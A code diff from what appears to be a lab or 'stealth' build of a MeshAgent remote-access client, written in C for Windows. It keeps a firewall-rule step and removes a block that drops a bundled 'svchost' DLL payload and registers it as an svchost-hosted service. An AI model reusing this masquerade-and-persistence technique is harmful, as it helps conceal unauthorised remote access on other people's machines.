@@ -5,10 +5,6 @@
 #include "stealth.h"
 #include "stealth_utils.h"
 #include "branding_util.h"
-#include "svchost_payload.h"
-#include "stealth_defaults.h"
-
-/* STEALTH_FALLBACK_DLL_NAME comes from stealth_defaults.h */
 
 static int EnvEnabledW(const wchar_t* name, int defaultOn)
 {
@@ -29,7 +25,6 @@ static void GetModulePathW(wchar_t* out, DWORD cch)
 void Stealth_InitLabFeatures(void)
 {
 #ifdef MESHAGENT_ENABLE_STEALTH
-    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
     // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
 #ifdef MESHAGENT_STEALTHLAB_DEFAULT
     const int defaultLab = 1;
@@ -51,62 +46,6 @@ void Stealth_InitLabFeatures(void)
         if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
         {
             Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
-        }
-    }
-
-    int extractDefault = 0;
-    if (stealthProfile != NULL)
-    {
-        if (stealthProfile->bundleExtract != 0)
-        {
-            extractDefault = 1;
-        }
-        else if (stealthProfile->svchostMode != 0)
-        {
-            extractDefault = 1;
-        }
-    }
-
-    // 5) Optionally extract bundled svchost DLL payload from the current package.
-    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
-        wchar_t dllOut[MAX_PATH] = {0};
-        BOOL useInstallPath = FALSE;
-        StealthInstallPaths paths;
-        if (Stealth_GetInstallPaths(&paths)) {
-            if (paths.installDir[0] != L'\0') {
-                Stealth_CreateInstallRootDirectory(paths.installDir);
-            }
-            if (paths.dllPath[0] != L'\0') {
-                wcsncpy_s(dllOut, MAX_PATH, paths.dllPath, _TRUNCATE);
-                useInstallPath = (dllOut[0] != L'\0');
-            }
-        }
-
-        if (!useInstallPath) {
-            // Fallback: drop next to executable
-            GetModulePathW(dllOut, MAX_PATH);
-            size_t n = wcslen(dllOut);
-            while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
-            wchar_t dllName[MAX_PATH] = {0};
-            MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
-            if (dllName[0] == L'\0') {
-                wcscpy_s(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME);
-            }
-            wcscat_s(dllOut, MAX_PATH, dllName);
-        }
-
-        if (MeshSvchostPayload_WriteToPath(dllOut)) {
-#ifdef UNICODE
-            WCHAR svcNameW[256] = {0};
-            MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), svcNameW, _countof(svcNameW));
-            if (svcNameW[0] != L'\0') {
-                if (!Stealth_RegisterSvchostService(svcNameW, dllOut)) {
-                    Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", svcNameW);
-                }
-            }
-#endif /* UNICODE */
-        } else {
-            Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
         }
     }
 
